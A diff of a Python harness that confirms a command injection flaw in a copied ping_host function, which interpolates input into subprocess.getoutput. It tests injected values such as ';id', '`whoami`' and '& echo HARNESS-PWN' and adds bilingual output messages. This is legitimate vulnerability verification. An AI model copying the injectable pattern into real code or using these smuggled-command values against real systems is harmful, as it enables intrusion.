@@ -1,57 +1,72 @@
+#!/usr/bin/env python3
 """Harness: Verify command injection in ping_host via subprocess.getoutput.
 
 This harness extracts the exact vulnerable function from src/board/engine.py:77-79
 and tests it with benign and malicious payloads to confirm shell metacharacter injection.
 """
+import argparse
 import subprocess
 
+MSGS = {
+    "benign": ("Benign host=", "正常 host="),
+    "inject": ("Inject host=", "注入 host="),
+    "confirmed": ("Command injection confirmed with payload", "命令注入已用该载荷确认"),
+    "miss": ("No injected command output observed.", "未观察到注入命令的输出。"),
+}
 
-# Exact copy of the vulnerable function from src/board/engine.py:77-79
+
+def msg(key: str, zh: bool) -> str:
+    en, zh_s = MSGS[key]
+    return zh_s if zh else en
+
+
 def ping_host(host: str) -> str:
     # Host is interpolated into a shell command and the output is returned.
     return subprocess.getoutput(f"echo MEMO-PING {host}")
 
 
-def main():
-    # Test 1: Benign input — normal behaviour
-    r1 = ping_host("127.0.0.1")
-    print(f"[Benign]  host=127.0.0.1  →  {r1!r}")
+def main() -> int:
+    p = argparse.ArgumentParser(description="MemoBoard ping command-injection harness")
+    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
+    args = p.parse_args()
+    zh = args.zh
 
-    # Test 2: Semicolon injection — classic command injection
-    r2 = ping_host(";id")
-    print(f"[Inject]  host=;id        →  {r2!r}")
+    benign = ping_host("127.0.0.1")
+    print(f"{msg('benign', zh)}127.0.0.1 -> {benign!r}")
 
-    # Test 3: Semicolon + whoami
-    r3 = ping_host(";whoami")
-    print(f"[Inject]  host=;whoami   →  {r3!r}")
+    injected_id = ping_host(";id")
+    print(f"{msg('inject', zh)};id -> {injected_id!r}")
 
-    # Test 4: Backtick injection variant
-    r4 = ping_host("`whoami`")
-    print(f"[Inject]  host=`whoami`  →  {r4!r}")
+    injected_whoami = ping_host(";whoami")
+    print(f"{msg('inject', zh)};whoami -> {injected_whoami!r}")
 
-    # Verify command injection succeeded
-    success = False
-    for label, result in [(";id", r2), (";whoami", r3), ("`whoami`", r4)]:
-        lines = [l for l in result.strip().split("\n") if l.strip()]
-        if len(lines) > 1 or (len(lines) == 1 and "MEMO-PING" not in lines[0]):
-            if "uid=" in result or (result.strip() and "whoami" not in result):
-                success = True
-                print(f"\n[+] Command injection CONFIRMED with payload '{label}'")
-                print(f"    Response contains injected command output: {result!r}")
-                break
+    injected_tick = ping_host("`whoami`")
+    print(f"{msg('inject', zh)}`whoami` -> {injected_tick!r}")
 
-    if not success:
-        if "uid=" in r2 or "uid=" in r3:
-            success = True
-            print(f"\n[+] Command injection CONFIRMED — uid= found in response")
+    # `& echo` is interpreted by both /bin/sh (sandbox) and cmd.exe (Windows hosts).
+    injected_amp = ping_host("& echo HARNESS-PWN")
+    print(f"{msg('inject', zh)}& echo HARNESS-PWN -> {injected_amp!r}")
 
-    if success:
-        print("\n=== VULNERABILITY CONFIRMED: subprocess.getoutput(f\"echo MEMO-PING {host}\") allows command injection ===")
-    else:
-        print("\n=== NOT CONFIRMED ===")
-        print(f"r2 = {r2!r}")
-        print(f"r3 = {r3!r}")
+    for label, result in (
+        (";id", injected_id),
+        (";whoami", injected_whoami),
+        ("`whoami`", injected_tick),
+        ("& echo HARNESS-PWN", injected_amp),
+    ):
+        lines = [line for line in result.strip().split("\n") if line.strip()]
+        extra = len(lines) > 1 or (len(lines) == 1 and "MEMO-PING" not in lines[0])
+        if extra or "uid=" in result or "HARNESS-PWN" in result:
+            print(msg("confirmed", zh), label)
+            print(result)
+            return 0
+
+    print(msg("miss", zh))
+    print(injected_id)
+    print(injected_whoami)
+    print(injected_tick)
+    print(injected_amp)
+    return 1
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
